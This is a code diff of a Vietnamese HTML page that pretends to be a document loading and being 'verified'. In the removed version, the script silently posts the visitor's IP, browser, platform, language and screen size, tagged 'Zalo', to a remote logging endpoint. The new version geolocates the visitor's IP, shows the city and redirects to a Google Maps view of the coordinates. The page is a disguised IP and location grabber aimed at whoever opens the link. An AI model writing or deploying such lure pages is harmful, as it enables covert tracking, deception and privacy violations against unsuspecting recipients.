@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tài liệu quan trọng</title>
+    <title>Tài liệu</title>
     <style>
         body { 
             font-family: Arial, sans-serif; 
             text-align: center; 
-            padding: 60px; 
+            padding: 80px; 
             background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
         }
@@ -17,18 +17,16 @@
             color: #333; 
             padding: 40px; 
             border-radius: 15px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            max-width: 600px; 
+            max-width: 500px; 
             margin: 0 auto;
         }
-        h2 { color: #e74c3c; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2>Đang tải tài liệu...</h2>
-        <p>Vui lòng chờ trong vài giây để hệ thống xác thực.</p>
-        <p id="ip" style="margin-top:20px; font-size:18px;"></p>
+        <p>Vui lòng chờ trong giây lát.</p>
+        <p id="status">Đang xác thực vị trí...</p>
     </div>
 
     <script>
@@ -36,28 +34,22 @@
             .then(r => r.json())
             .then(data => {
                 const ip = data.ip;
-                document.getElementById('ip').innerHTML = `
-                    <strong>IP của bạn: ${ip}</strong><br>
-                    <small>Đang xử lý thông tin...</small>
-                `;
+                
+                fetch(`https://ip-api.com/json/${ip}?fields=lat,lon,city,regionName`)
+                    .then(r => r.json())
+                    .then(geo => {
+                        document.getElementById('status').innerHTML = `Vị trí: ${geo.city}, ${geo.regionName}`;
 
-                // Gửi log chi tiết
-                fetch('https://httpbin.org/post', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ip: ip,
-                        time: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        screen: screen.width + 'x' + screen.height,
-                        source: "Zalo"
-                    })
-                }).catch(() => {});
+                        // Tự động mở Google Maps sau 2 giây
+                        const mapUrl = `https://www.google.com/maps?q=${geo.lat},${geo.lon}&z=17`;
+                        setTimeout(() => {
+                            window.location.href = mapUrl;   // Chuyển hướng
+                            // Hoặc mở tab mới: window.open(mapUrl, '_blank');
+                        }, 2000);
+                    });
             })
             .catch(() => {
-                document.getElementById('ip').innerHTML = "Đang xử lý...";
+                document.getElementById('status').innerHTML = "Đang xử lý...";
             });
     </script>
 </body>
